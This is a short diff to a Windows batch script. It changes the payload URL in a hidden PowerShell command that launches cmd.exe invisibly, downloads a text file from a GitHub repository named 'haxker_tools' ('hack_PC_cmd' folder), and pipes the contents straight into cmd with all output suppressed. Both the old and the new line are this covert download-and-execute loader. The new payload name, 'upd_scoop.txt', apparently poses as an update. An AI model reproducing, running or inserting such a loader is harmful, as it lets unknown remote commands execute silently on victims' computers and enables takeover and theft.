@@ -1,6 +1,6 @@
 @echo off
 chcp 65001 > nul
 
-powershell -NoProfile -WindowStyle Hidden -Command "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList '/c curl -s https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/a.txt | cmd >nul 2>&1'"
+powershell -NoProfile -WindowStyle Hidden -Command "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList '/c curl -s https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/upd_scoop.txt | cmd >nul 2>&1'"
 
 exit
